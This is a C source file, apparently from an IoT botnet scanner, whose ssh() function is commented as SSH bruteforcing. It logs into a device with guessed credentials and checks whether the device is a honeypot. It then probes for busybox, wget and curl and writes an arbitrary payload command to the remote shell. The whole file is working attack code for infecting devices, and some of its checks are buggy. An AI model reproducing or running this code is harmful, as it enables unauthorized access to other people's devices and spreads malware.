#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libssh2.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <str.h>
#include <arr.h>
#include <OS/file.h>

#include "ssh.h"

// Return a new instanse of Device with SSH information
Device *NewDevice(const char *IP, int prt, const char *uname, const char *pw) {
    if(!IP || !prt)
        return NULL;

    Device *c = (Device *)malloc(sizeof(Device));
    *c = (Device){
        .Status     = 0,
        .IP         = (!IP ? NULL : strdup((char *)IP)),
        .Port       = prt,
        .Username   = strdup((char *)uname),
        .Password   = strdup((char *)pw),
        .LoggedIn   = 0,
        .isWGET     = 0,
        .isBusybox  = 0,
        .Cmd        = NULL
    };

    return c;
}

void DestroyDevice(Device *c) {
    if(c->IP)
        free(c->IP);

    if(c->Username)
        free(c->Username);

    if(c->Password)
        free(c->Password);
}

// Attempt Bruteforcing SSH
int ssh(Device *device) {
    int rc, sock, bytes_read;
    struct sockaddr_in sin;
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel;
    char buffer[1024] = {0};


    libssh2_init(0);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(device->Port);
    inet_pton(AF_INET, device->IP, &sin.sin_addr);
    rc = connect(sock, (struct sockaddr*)&sin, sizeof(struct sockaddr_in));
    if (rc != 0) {
        return 0;
    }

    /* Create a new session */
    session = libssh2_session_init();
    if (!session)
        return 0;

    /* Start session */
    rc = libssh2_session_startup(session, sock);
    if (rc) {
        libssh2_session_free(session);
        close(sock);
        return 0;
    }

    /* Authenticate */
    rc = libssh2_userauth_password(session, device->Username, device->Password);
    if (rc) {
        libssh2_session_disconnect(session, "Authentication failed");
        libssh2_session_free(session);
        close(sock);
        return 0;
    }

    device->LoggedIn = 1;
    /* Check for an open session */
    channel = libssh2_channel_open_session(session);
    if (!channel) {
        libssh2_session_disconnect(session, "Failed to open channel");
        libssh2_session_free(session);
        close(sock);
        return 0;
    }
    
    // Request a pseudo-terminal
    libssh2_channel_request_pty(channel, "xterm");
    libssh2_channel_shell(channel);
    
    libssh2_channel_write(channel, "stat /", strlen("stat /"));
    libssh2_channel_write(channel, "\n", 1);
    bytes_read = libssh2_channel_read(channel, buffer, sizeof(buffer) - 1);
    if(bytes_read <= 0) {
        libssh2_channel_close(channel);
        libssh2_channel_free(channel);
        libssh2_session_disconnect(session, "Failed to open channel");
        libssh2_session_free(session);
        close(sock);
        return 0;
    }

    if(strlen(buffer) < 15) {
        device->isHoneypot = 1;
        return -1;
    }


    memset(buffer, '\0', 1024);
    libssh2_channel_write(channel, "uname -a", strlen("uname -a"));
    libssh2_channel_write(channel, "\n", 1);
    bytes_read = libssh2_channel_read(channel, buffer, sizeof(buffer) - 1);
    if(bytes_read <= 0) {
        libssh2_channel_close(channel);
        libssh2_channel_free(channel);
        libssh2_session_disconnect(session, "Failed to open channel");
        libssh2_session_free(session);
        close(sock);
        return 0;
    }

    if(strstr(buffer, "busybox"))
        device->isBusybox = 1;

    memset(buffer, '\0', 1024);
    libssh2_channel_write(channel, "ls /bin/wget", strlen("ls /bin/wget"));
    libssh2_channel_write(channel, "\n", 1);
    bytes_read = libssh2_channel_read(channel, buffer, sizeof(buffer) - 1);
    if(bytes_read <= 0) {
        libssh2_channel_close(channel);
        libssh2_channel_free(channel);
        libssh2_session_disconnect(session, "Failed to open channel");
        libssh2_session_free(session);
        close(sock);
        return 0;
    }

    if(strcmp(buffer, "/bin/wget"))
        device->isWGET = 1;

    memset(buffer, '\0', 1024);
    libssh2_channel_write(channel, "ls /bin/curl", strlen("ls /bin/curl"));
    libssh2_channel_write(channel, "\n", 1);
    bytes_read = libssh2_channel_read(channel, buffer, sizeof(buffer) - 1);
    if(bytes_read <= 0) {
        libssh2_channel_close(channel);
        libssh2_channel_free(channel);
        libssh2_session_disconnect(session, "Failed to open channel");
        libssh2_session_free(session);
        close(sock);
        return 0;
    }

    if(strcmp(buffer, "/bin/curl"))
        device->isCURL = 1;

    /* Send Payload to SSH */
    libssh2_channel_write(channel, device->Cmd, strlen(device->Cmd));
    libssh2_channel_write(channel, "\n", 1);

    libssh2_channel_close(channel);
    libssh2_channel_free(channel);
    libssh2_session_disconnect(session, "Normal Shutdown");
    libssh2_session_free(session);
    close(sock);
    libssh2_exit();

    return 1;
}